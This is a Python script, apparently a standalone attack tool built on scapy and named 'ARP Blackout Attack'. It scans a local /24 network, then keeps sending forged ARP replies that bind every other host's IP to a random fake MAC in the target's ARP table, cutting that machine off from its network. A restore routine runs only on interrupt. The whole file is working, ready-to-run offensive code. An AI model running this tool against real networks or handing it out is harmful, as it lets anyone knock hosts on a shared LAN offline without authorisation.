from scapy.all import Ether, ARP, sendp, get_if_hwaddr, srp, conf, get_if_addr
import time
import sys
import argparse
import random

def rand_mac():
    common_ouis = [
        "00:0C:29",  # VMware
        "00:50:56",  # VMware
        "00:1A:11",  # Google
        "00:03:93",  # Apple
        "00:0A:27",  # Apple
        "00:1C:42",  # Parallels
        "00:25:90",  # Super Micro Computer
        "00:26:18",  # ASUSTek
        "00:E0:4C",  # Realtek
        "D8:3A:DD",  # Intel
        "48:51:B7",  # Intel
        "94:C6:91",  # Dell
    ]
    
    oui = random.choice(common_ouis)
    
    device_bytes = [random.randint(0, 255) for _ in range(3)]
    device_part = ":".join([f"{b:02x}" for b in device_bytes])
    return f"{oui}:{device_part}"

def unique_rand_mac(devices):
    mac=rand_mac()
    while mac in devices.values():
        mac=rand_mac()    
    return mac

def scan():
    ip="192.168.1.0/24"
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    devices={}
    for element in answered_list:
        devices[element[1].psrc]=  element[1].hwsrc
    current_ip = get_if_addr(conf.iface)
    devices[current_ip] = get_if_hwaddr(conf.iface)
    return devices

def spoof(from_mac, from_ip,to_ip,interface, devices):
    to_mac = devices[to_ip]
    
    packet = Ether(dst=to_mac, src=from_mac) / \
             ARP(op=2, pdst=to_ip, hwdst=to_mac, psrc=from_ip, hwsrc=from_mac)
    sendp(packet, count=3, inter=0.2, iface=interface, verbose=0)
    return

def restore(ip, iface, devices):
    for from_ip in devices.keys():
        from_mac = devices[from_ip]
        to_mac = devices[ip]
        packet = Ether(dst=to_mac, src=from_mac) / \
                 ARP(op=2, pdst=ip, hwdst=to_mac, psrc=from_ip, hwsrc=from_mac)
        sendp(packet, count=3, inter=0.2, iface=iface, verbose=0)
    return

def start_attack(to_ip, iface,devices):
    mac= unique_rand_mac(devices)
    print(f"[*] Spoofing with MAC {mac}")
    for from_ip in devices.keys():
        if from_ip!= to_ip: spoof(mac, from_ip, to_ip, iface, devices)
    return

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='ARP Blackout Attack')
    parser.add_argument('target', help='IP of target')
    parser.add_argument('-i', '--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('-t', '--time', default=10, type=int,
                       help='Time interval to send ARP requests (default: 10)')
    
    args = parser.parse_args()
    
    ip = args.target
    iface = args.interface
    time_interval = args.time
    
    try:
        print(f"[*] Starting ARP attack on {args.target}")
        devices = scan()
            
        if ip not in devices: 
            print(f"[*] Target {ip} not found in network")
            print(f"[*] Devices on Network: ")
            print("IP\t\t\tMAC")
            for ip, mac in devices.items():
                print(f"{ip}\t{mac}")
            sys.exit(0)
        
        while True:
            start_attack(ip, iface,devices)
            time.sleep(time_interval)
            
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables")
        restore(ip, iface,devices)
        print("[*] ARP tables restored")
        sys.exit(0)